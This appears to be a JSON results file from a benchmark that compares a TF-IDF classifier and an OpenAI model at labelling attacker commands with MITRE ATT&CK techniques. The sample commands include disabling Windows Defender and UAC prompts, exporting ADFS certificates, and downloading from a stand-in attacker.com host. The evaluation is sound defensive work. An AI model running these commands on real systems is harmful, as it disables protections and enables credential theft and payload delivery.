@@ -1,0 +1,252 @@
+{
+  "samples": [
+    {
+      "ground_truth": "T1562",
+      "raw_command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul",
+      "tfidf_top1": "T1562",
+      "tfidf_top3": [
+        "T1562",
+        "T1112",
+        "T1490"
+      ],
+      "tfidf_conf": 0.6725,
+      "tfidf_ms": 106.03,
+      "openai_pred": "T1562",
+      "openai_ms": 1220.49,
+      "tfidf_correct": true,
+      "openai_correct": true
+    },
+    {
+      "ground_truth": "T1082",
+      "raw_command": "cat /etc/*release | uniq",
+      "tfidf_top1": "T1059",
+      "tfidf_top3": [
+        "T1059",
+        "T1562",
+        "T1036"
+      ],
+      "tfidf_conf": 0.1325,
+      "tfidf_ms": 82.52,
+      "openai_pred": "T1082",
+      "openai_ms": 710.31,
+      "tfidf_correct": false,
+      "openai_correct": true
+    },
+    {
+      "ground_truth": "T1558",
+      "raw_command": "echo End of Golden Ticket attack",
+      "tfidf_top1": "T1558",
+      "tfidf_top3": [
+        "T1558",
+        "T1548",
+        "T1059"
+      ],
+      "tfidf_conf": 0.795,
+      "tfidf_ms": 80.1,
+      "openai_pred": "T1491",
+      "openai_ms": 604.89,
+      "tfidf_correct": true,
+      "openai_correct": false
+    },
+    {
+      "ground_truth": "T1059",
+      "raw_command": "echo x | xargs -o -a /dev/null /bin/sh",
+      "tfidf_top1": "T1059",
+      "tfidf_top3": [
+        "T1059",
+        "T1140",
+        "T1036"
+      ],
+      "tfidf_conf": 0.8925,
+      "tfidf_ms": 92.95,
+      "openai_pred": "T1059",
+      "openai_ms": 905.83,
+      "tfidf_correct": true,
+      "openai_correct": true
+    },
+    {
+      "ground_truth": "T1552",
+      "raw_command": "Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key",
+      "tfidf_top1": "T1552",
+      "tfidf_top3": [
+        "T1552",
+        "T1562",
+        "T1021"
+      ],
+      "tfidf_conf": 0.1625,
+      "tfidf_ms": 89.7,
+      "openai_pred": "T1552",
+      "openai_ms": 695.51,
+      "tfidf_correct": true,
+      "openai_correct": true
+    },
+    {
+      "ground_truth": "T1548",
+      "raw_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force",
+      "tfidf_top1": "T1548",
+      "tfidf_top3": [
+        "T1548",
+        "T1112",
+        "T1562"
+      ],
+      "tfidf_conf": 0.3575,
+      "tfidf_ms": 90.21,
+      "openai_pred": "T1548",
+      "openai_ms": 1093.39,
+      "tfidf_correct": true,
+      "openai_correct": true
+    },
+    {
+      "ground_truth": "T1059",
+      "raw_command": "WantedBy=multi-user.target' >/path/to/temp-file.service",
+      "tfidf_top1": "T1059",
+      "tfidf_top3": [
+        "T1059",
+        "T1543",
+        "T1105"
+      ],
+      "tfidf_conf": 0.4025,
+      "tfidf_ms": 95.31,
+      "openai_pred": "T1543",
+      "openai_ms": 547.17,
+      "tfidf_correct": true,
+      "openai_correct": false
+    },
+    {
+      "ground_truth": "T1105",
+      "raw_command": "julia -e 'download(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'",
+      "tfidf_top1": "T1105",
+      "tfidf_top3": [
+        "T1105",
+        "T1222",
+        "T1005"
+      ],
+      "tfidf_conf": 0.915,
+      "tfidf_ms": 85.06,
+      "openai_pred": "T1105",
+      "openai_ms": 678.48,
+      "tfidf_correct": true,
+      "openai_correct": true
+    },
+    {
+      "ground_truth": "T1074",
+      "raw_command": "c:\\ProgramData\\found_shares.txt",
+      "tfidf_top1": "T1135",
+      "tfidf_top3": [
+        "T1135",
+        "T1074",
+        "T1564"
+      ],
+      "tfidf_conf": 0.2975,
+      "tfidf_ms": 83.01,
+      "openai_pred": "T1005",
+      "openai_ms": 800.7,
+      "tfidf_correct": false,
+      "openai_correct": false
+    },
+    {
+      "ground_truth": "T1105",
+      "raw_command": "dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}",
+      "tfidf_top1": "T1105",
+      "tfidf_top3": [
+        "T1105",
+        "T1218",
+        "T1564"
+      ],
+      "tfidf_conf": 0.3925,
+      "tfidf_ms": 83.62,
+      "openai_pred": "T1564",
+      "openai_ms": 734.43,
+      "tfidf_correct": true,
+      "openai_correct": false
+    },
+    {
+      "ground_truth": "T1078",
+      "raw_command": "gcloud iam service-accounts create $service-account-name",
+      "tfidf_top1": "T1098",
+      "tfidf_top3": [
+        "T1098",
+        "T1078",
+        "T1543"
+      ],
+      "tfidf_conf": 0.26,
+      "tfidf_ms": 85.29,
+      "openai_pred": "T1136",
+      "openai_ms": 1998.72,
+      "tfidf_correct": false,
+      "openai_correct": false
+    },
+    {
+      "ground_truth": "T1217",
+      "raw_command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> $output_file \\;",
+      "tfidf_top1": "T1217",
+      "tfidf_top3": [
+        "T1217",
+        "T1552",
+        "T1083"
+      ],
+      "tfidf_conf": 0.4,
+      "tfidf_ms": 80.28,
+      "openai_pred": "T1217",
+      "openai_ms": 1496.28,
+      "tfidf_correct": true,
+      "openai_correct": true
+    },
+    {
+      "ground_truth": "T1134",
+      "raw_command": "ImpersonateNamedPipeClient",
+      "tfidf_top1": "T1036",
+      "tfidf_top3": [
+        "T1036",
+        "T1106",
+        "T1059"
+      ],
+      "tfidf_conf": 0.1875,
+      "tfidf_ms": 91.29,
+      "openai_pred": "T1134",
+      "openai_ms": 859.17,
+      "tfidf_correct": false,
+      "openai_correct": true
+    },
+    {
+      "ground_truth": "T1562",
+      "raw_command": "swapoff -a",
+      "tfidf_top1": "T1548",
+      "tfidf_top3": [
+        "T1548",
+        "T1049",
+        "T1105"
+      ],
+      "tfidf_conf": 0.12,
+      "tfidf_ms": 90.69,
+      "openai_pred": "T1562",
+      "openai_ms": 754.23,
+      "tfidf_correct": false,
+      "openai_correct": true
+    },
+    {
+      "ground_truth": "T1070",
+      "raw_command": "/var/log/httpd/",
+      "tfidf_top1": "T1070",
+      "tfidf_top3": [
+        "T1070",
+        "T1543",
+        "T1074"
+      ],
+      "tfidf_conf": 0.8,
+      "tfidf_ms": 82.91,
+      "openai_pred": "T1005",
+      "openai_ms": 869.82,
+      "tfidf_correct": true,
+      "openai_correct": false
+    }
+  ],
+  "summary": {
+    "n": 15,
+    "tfidf_top1": 10,
+    "tfidf_top3": 12,
+    "openai_top1": 9,
+    "avg_tfidf_ms": 87.93,
+    "avg_oai_ms": 931.29
+  }
+}
